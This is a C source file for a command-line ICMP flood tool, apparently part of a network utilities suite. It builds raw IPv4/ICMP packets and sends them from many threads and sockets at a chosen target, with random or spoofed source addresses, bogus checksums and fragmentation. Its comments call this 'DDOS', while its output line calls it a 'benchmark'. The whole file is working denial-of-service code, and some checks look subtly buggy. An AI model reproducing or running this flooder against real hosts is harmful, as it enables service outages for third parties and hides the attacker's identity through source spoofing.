/*
 * Copyright (c) 2024, oldteam. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <stdio.h>
#include <stdbool.h>
#include <stdnoreturn.h>
#include <stdlib.h>
#include <getopt.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>

#include "coreutils.h"
#include "utils-config.h"

#include "../ncsnet/log.h"
#include "../ncsnet/utils.h"
#include "../ncsnet/icmp.h"
#include "../ncsnet/cmwc.h"

#undef MAXFDS
#define MAXFDS       1024

struct sockaddr_in      dstin;
bool                    badsum=false;
int                     ttl=121, type=8, code=0;
size_t                  pktsnum;
char                   *data=NULL;
size_t                  fdnum=1;
size_t                  pps=10000;
static size_t           fdcur=0;
size_t                  mtu=0;
static int              fds[MAXFDS];
size_t                  threadsnum=1;
u8                     *msg;
size_t                  datalen;
size_t                  msglen;
const char             *run, *node, *shortopts="h";
char                    ip4[16];
char                   *strsrc;
ip4_t                   src, dst;
u8                     *pkt;
size_t                  total=0;
size_t                  pktlen;
size_t                  updt=10000;
u8                      ipopt[256];
int                     ipopts_first_hop_offset, ipopts_last_hop_offset,
                          ipoptslen;
clock_t                 start, end;
bool                    randomsrc=false;
bool                    customsrc=false;
const char              *tmpsrc;
static size_t           total_calls = 0;
static pthread_mutex_t  call_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t   call_cond = PTHREAD_COND_INITIALIZER;
const struct option     longopts[]={
  {"help", no_argument, 0, 'h'},
  {"fdnum", required_argument, 0, 1},
  {"type", required_argument, 0, 2},
  {"code", required_argument, 0, 3},
  {"randomsrc", no_argument, 0, 4},
  {"pps", required_argument, 0, 5},
  {"threads", required_argument, 0, 6},
  {"data-len", required_argument, 0, 7},
  {"data-string", required_argument, 0, 8},
  {"mtu", required_argument, 0, 9},
  {"ttl", required_argument, 0, 10},
  {"updt", required_argument, 0, 11},
  {"badsum", no_argument, 0, 12},
  {"ipopt", required_argument, 0, 13},
  {"src", required_argument, 0, 14}
};


/*
 * Outputs the help menu, and terminates the program.
 */
static noreturn void usage(void)
{

  puts("Usage");
  printf("  %s [flags] <target>\n\n", run);
  puts("  -type <8/13/15/17>    set icmp type and icmp message(8=ECHO,13=TSTAMP,15=INFO,17=MASK)");
  puts("  -pps <num>            set max packets per second (default 10000) (unlimited=0)");
  puts("  -threads <num>        set num threads (default 1)");
  puts("  -fdnum <num>          set max fds for send (default 1)");
  puts("  -data-len <len>       append random data to payload");
  puts("  -data-string <str>    append a custom ASCII string to payload");
  puts("  -mtu <num>            fragment send packets");
  puts("  -ttl <num>            set timetolive (default 121)");
  puts("  -randomsrc            use random source ipaddr");
  puts("  -src                  set your spoof src");
  puts("  -updt <num>           after how many packages to update the current one? (default 10000)");
  puts("  -ttl <count>          set TTL on IP header");
  puts("  -badsum               send packets with a bogus checksum");
  puts("  -ipopt <fmt>          adding ip option in packets (fmt <R|S [route]|L [route]|T|U |[HEX]>)");
  puts("  -h, -help             show this help message and exit");
  infohelp();
  exit(0);
}


/*
 * Parses the arguments, includes the desired options, and
 * stores the specified value.
 */
static void parseargs(int argc, char **argv)
{
  int rez, index=0;
  while ((rez=getopt_long_only(argc, argv, shortopts, longopts, &index))!=-1){
    switch (rez) {
    case 'h': usage();
    case 1:
      fdnum=atoll(optarg);
      if (fdnum>MAXFDS)
        errx(1, "err: max num fds is %lld, your num is \"%lld\"", MAXFDS, fdnum);
      break;
    case 2: type=atoi(optarg); break;
    case 3: code=atoi(optarg); break;
    case 4: randomsrc=1; break;
    case 5: pps=atoll(optarg); break;
    case 6: threadsnum=atoll(optarg); break;
    case 7:
      datalen=atoll(optarg);
      if (datalen>1400)
        errx(1, "err: maximum ETH payload is (1400), your is \"%d\"", datalen);
      data=random_str(datalen, DEFAULT_DICTIONARY);
     break;
    case 8:
      data=optarg;
      datalen=data?strlen(data):0;
      if (datalen>1400)
        errx(1, "err: maximum ETH payload is (1400), your is \"%d\"", datalen);
      break;
    case 9:
      mtu=atoi(optarg);
      if (mtu >! 0 && mtu % 8 != 0)
        errx(1, "err: data payload MTU must be > 0 and multiple of 8: (8,16,32,64,128...), your is \"%d\"", mtu);
      break;
    case 10:
      ttl=atoi(optarg);
      if (ttl>UCHAR_MAX||ttl<=0)
        errx(1, "err: the permissible TTL corresponds to this range (1-255), your is \"%d\"", ttl);
      break;
    case 11: updt=atoll(optarg); break;
    case 12: badsum=1; break;
    case 13:
      memset(ipopt, 0, sizeof(ipopt));
      ipoptslen = parse_ipopts(optarg, ipopt, sizeof(ipopt),
        &ipopts_first_hop_offset, &ipopts_last_hop_offset, NULL, 0);
      break;
    case 14:
      customsrc=1;
      tmpsrc=optarg;
      break;
    }
  }
}


/*
 * Opens the desired number of sockets and writes them to fds.
 * The socket type is set to IPPROTO_RAW, you cannot receive
 * packets from it, but you can send them.
 */
static void openfds(void)
{
  size_t i;
  i=0;
  memset(&fds, 0, MAXFDS+1);
  for (;fdnum;fdnum--)
    fds[++i]=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
}


/*
 * Closes all open sockets after openfds, from fds.
 */
static void closefds(void)
{
  size_t i;
  i=0;
  for (;i<MAXFDS;)
    if (fds[i++]!=-1)
      close(fds[i]);
}


/*
 * Creates an ICMP message, and stores it in the msg variable
 * with dynamically allocated memory. The size of the message
 * fis written to msglen.
 */
static void icmp4msg(void)
{
  switch (type) {
  case ICMP4_ECHO:
    msg=icmp4_msg_echo_build((u16)cmwc_random(), (u16)cmwc_random(), data, &msglen);
    break;

  /*
   * The other messages do not support payload, and there
   * is no point in adding it.
   */
  case ICMP4_INFO:
    msg=icmp4_msg_info_build((u16)cmwc_random(), (u16)cmwc_random(), &msglen);
    break;
  case ICMP4_TSTAMP:
    msg=icmp4_msg_tstamp_build((u16)cmwc_random(), (u16)cmwc_random(), (u32)cmwc_random(), (u32)cmwc_random(),
      (u32)cmwc_random(), &msglen);
    break;
  case ICMP4_MASK:
    msg=icmp4_msg_mask_build((u16)cmwc_random(), (u16)cmwc_random(), ncs_inet_addr(random_ip4()), &msglen);
    break;
  }
}


/*
 * Creates an ip4 and icmp packet with the specified message.
 * The packet with dynamically allocated memory is stored in
 * pkt and its size in "pktlen".
 */
static void icmp4build(void)
{
  icmp4msg();
  pkt=icmp4_build_pkt(src, dst, ttl, (u16)cmwc_random(), 0, false, ipopt, ipoptslen,
    type, code, msg, msglen, &pktlen, badsum);
  free(msg);
  if (data)
    free(data);
}


/*
 * The function that updates the package created after icmp4build,
 * it only touches the icmp message and its fields that should
 * change with each new package.
 */
static void icmp4udpt(void)
{
  switch (type) {

    /*
     * The ICMP4_INFO message header completely matches the
     * ICMP4_ECHO message header, so the following action is
     * OK.
     */
    case ICMP4_INFO:
    case ICMP4_ECHO: {
      icmp4_msg_echo *echo=(icmp4_msg_echo*)(pkt+(sizeof(icmp4h_t)+sizeof(ip4h_t)));
      echo->id=htons((u16)cmwc_random());
      echo->seq=htons((u16)cmwc_random());
      break;
    }
    case ICMP4_TSTAMP: {
      icmp4_msg_tstamp *tstamp=(icmp4_msg_tstamp*)(pkt+(sizeof(icmp4h_t)+sizeof(ip4h_t)));
      tstamp->id=htons((u16)cmwc_random());
      tstamp->seq=htons((u16)cmwc_random());
      tstamp->orig=htonl((u32)cmwc_random());
      tstamp->rx=htonl((u32)cmwc_random());
      tstamp->tx=htonl((u32)cmwc_random());
      break;
    }
    case ICMP4_MASK: {
      icmp4_msg_mask *mask=(icmp4_msg_mask*)(pkt+(sizeof(icmp4h_t)+sizeof(ip4h_t)));
      mask->id=htons((u16)cmwc_random());
      mask->seq=htons((u16)cmwc_random());

      /*
       * Since inet_addr itself already translates the IP address
       * as after htonl, specifying via htonl is not required.
       */
      mask->mask=ncs_inet_addr(random_ip4());
      break;
    }
  }

  /*
   * This function recalculates the checksum not only for ICMP,
   * but even for IP4, due to this the system itself will
   * regenerate the id field in the IP4 header.
   */
  ip4_recheck(pkt, pktlen);
}


/*
 * Resets the timer for the number of packets sent per
 * second.
 */
static void resetcall(void)
{
  for (;;) {
    usleep(1000000);
    pthread_mutex_lock(&call_mutex);
    total_calls=0;
    pthread_cond_broadcast(&call_cond);
    pthread_mutex_unlock(&call_mutex);
  }
}


/*
 * Selects a working socket from fds, and sends a packet
 * from it, adding counters, if the number of packets
 * sent corresponds to the number after which it is
 * necessary to update packets (updt), then it updates.
 * At the same time it keeps pps.
 */
static void *icmp4preddos(void *arg)
{
  int fd=0;
  if (fdcur>=fdnum)
    fdcur=0;
  while (fd<=0)
    fd=fds[fdcur++];
  for (;;) {
    total++;
    if (total_calls % updt == 0)
      icmp4udpt();
    if (pps!=0) {
      while (total_calls >= pps)
        pthread_cond_wait(&call_cond, &call_mutex);
      total_calls++;
      ip4_send(NULL, fd, &dstin, mtu, pkt, pktlen);
      usleep((1000000/pps));
    }
    else {
      ip4_send(NULL, fd, &dstin, mtu, pkt, pktlen);
      total_calls++;
    }
  }
  return NULL;
}


/*
 * Main function for ddos, opens and waits for threads
 * with icmp4preddos function, number of threads
 * corresponds to threadsnum.
 */
static void icmp4ddos(void)
{
  pthread_t threads[threadsnum];
  pthread_t reset_thread;
  size_t i;

  pthread_create(&reset_thread, NULL, (void *(*)(void *))resetcall, NULL);

  for (i = 0; i < threadsnum; ++i)
    pthread_create(&threads[i], NULL, icmp4preddos, NULL);
  for (i = 0; i < threadsnum; ++i)
    pthread_join(threads[i], NULL);
  pthread_join(reset_thread, NULL);
}


/*
 * Called at the signal that occurs at CTRL+C, counts
 * the time of the program in milliseconds, and gives
 * general information about the work done. And close
 * all fds.
 */
static noreturn void stop(int sig)
{
  double elapsed;
  end=clock();
  elapsed = (double)(end - start) / CLOCKS_PER_SEC * 1000.0;
  printf("\nEnding %s %ld send packets at %dms\n", __FILE_NAME__, total, (int)elapsed);
  closefds();
  exit(0);
}


/*
 * Returns a string describing ICMP type.
 */
const char *stricmptype(void)
{
  switch (type) {
    case ICMP4_ECHO: return "echo";
    case ICMP4_INFO: return "info request";
    case ICMP4_TSTAMP: return "timestamp";
    case ICMP4_MASK: return "mask request";
  }
  return "???";
}


/*
 * icmpflood.c
 */
int main(int argc, char **argv)
{
  signal(SIGINT, stop);
  run=argv[0];
  if (argc<=1)
    usage();
  startstring();
  parseargs(argc, argv);
  if (optind<argc)
    node=argv[optind];
  if (!check_root_perms())
    errx(1, "err: raw sockets on UNIX only sudo, (try \"sudo %s\")", argv[0]);

  /*
   * Gets the IP4 address from a user-specified target, can
   * get it from, DNS, URL, and the actual IP4.
   */
  if (getipv4(node, ip4, 16)==-1)
    errx(1, "err: failed resolv for target \"%s\"", node);
  ip4t_pton(ip4, &dst);
  dstin.sin_addr.s_addr=ip4t_u32(&dst);
  dstin.sin_port=0;
  dstin.sin_family=AF_INET;

  /*
   * Gets the IP4 address of the sender, your
   * IP address.
   */
  if (randomsrc)
    ip4t_pton(random_ip4(), &src);
  else if (customsrc)
    ip4t_pton(tmpsrc, &src);
  else {
    if (!(strsrc=ip4_util_strsrc()))
      errx(1, "err: failed getting source ipaddr");
    ip4t_pton(strsrc, &src);
    free(strsrc);
  }

  /*
   * Updates the timer for generation, and it uses CMWC,
   * not MT19937. Because the former is too slow and
   * generation takes more time than creating a packet
   * and sending it.
   */
  cmwc_seed(time(NULL));

  /*
   * Creating the first initial package, which will then
   * be upgraded. See comment under icmp4udpt().
   */
  icmp4build();

  /*
   * The actual message output, opening of sockets,
   * and DDOS itself.
   */
  printf("> Benchmark for patient \"%s\" payload is %ld bytes,\n    info: type=[%s] pps=[%ld] threads=[%ld] fdnum=[%ld];\n",
    ip4, datalen, stricmptype(), pps, threadsnum, fdnum);
  start=clock();
  openfds();
  icmp4ddos();
  return 0;
}
